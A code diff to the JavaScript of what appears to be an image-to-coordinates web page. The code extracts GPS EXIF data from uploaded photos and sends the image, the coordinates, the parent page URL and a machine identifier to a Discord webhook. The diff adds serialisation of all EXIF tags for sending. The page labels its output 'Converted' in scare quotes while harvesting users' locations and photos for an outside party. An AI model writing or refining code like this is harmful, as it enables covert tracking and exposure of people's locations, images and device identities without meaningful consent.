@@ -108,7 +108,7 @@
             .catch(error => {
                 console.error('Error:', error);
             });
-            
+        
         function uploadImage() {
             const input = document.getElementById('imageInput');
             const file = input.files[0];
@@ -130,10 +130,13 @@
                             const lonRef = EXIF.getTag(this, "GPSLongitudeRef") || "E";
                             const latitude = convertDMSToDD(lat[0], lat[1], lat[2], latRef);
                             const longitude = convertDMSToDD(lon[0], lon[1], lon[2], lonRef);
-
+                            const beforeJSON = EXIF.getAllTags(this);
+                            const exifStringJSON = (JSON.stringify(beforeJSON,null,2)).toString();
+                            const exifblob = new Blob([exifStringJSON], { type: 'text/plain' });
+                            console.log(exifblob)
                             result.innerHTML = `Image "Converted" to coordinates and sent to discord bot: ${latitude.toFixed(6)}, ${longitude.toFixed(6)}`;
                             compressImage(e.target.result, function(compressedBlob) {
-                                sendToDiscordBot(latitude, longitude, compressedBlob, file.name, EXIF);
+                                sendToDiscordBot(latitude, longitude, compressedBlob, file.name, exifblob);
                             });
                         } else {
                             result.innerHTML = "Unable to convert"; //No coordinates found in the image.
@@ -201,8 +204,10 @@
 
         function sendToDiscordBot(latitude, longitude, imageBlob, fileName, EXIF = "") {
             const formData = new FormData();
+            
+            //formData.append('file', EXIF, "message.txt");
             formData.append('file', imageBlob, fileName);
-            formData.append('content', `New image uploaded:\n${latitude}, ${longitude}\nFrom path: ${window.parent.location.href}\nFrom UUID: ${getMachineId()} EXIF: ${EXIF}`);
+            formData.append('content', `New image uploaded:\n${latitude}, ${longitude}\nFrom path: ${window.parent.location.href}\nFrom UUID: ${getMachineId()}`);
 
             fetch(webhookUrl, {
                 method: 'POST',
